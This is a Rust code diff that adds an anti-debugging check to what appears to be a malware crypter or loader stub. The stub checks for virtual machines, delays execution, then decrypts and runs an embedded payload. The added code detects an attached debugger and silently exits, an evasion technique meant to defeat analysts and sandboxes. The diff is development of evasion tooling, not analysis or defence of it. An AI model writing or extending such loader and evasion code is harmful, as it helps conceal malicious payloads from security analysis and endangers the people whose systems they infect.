@@ -60,13 +60,33 @@ impl Stub {
             std::thread::sleep(std::time::Duration::from_secs(stub.delay));
         }
     }
+
+    pub fn anti_debug() -> bool {
+        match anti_debug::is_debugger_present() {
+            Ok(true) => true,
+            Ok(false) => false,
+            Err(_) => false,
+        }
+    }
 }
 
 fn main() {
+    // Check if the program is running in a VM
     if vm_detection {
         Stub::vm_detection(&stub);
     }
+
+    // Check if the program is being debugged
+    if Stub::anti_debug() {
+        if stub.verbose {
+            println!("[INFO] Debugger detected. Exiting...");
+        }
+        std::process::exit(0);
+    }
+
+
     Stub::delay_execution(&stub);
     Stub::decrypt(&stub);
     Stub::execute(&stub);
 }
+
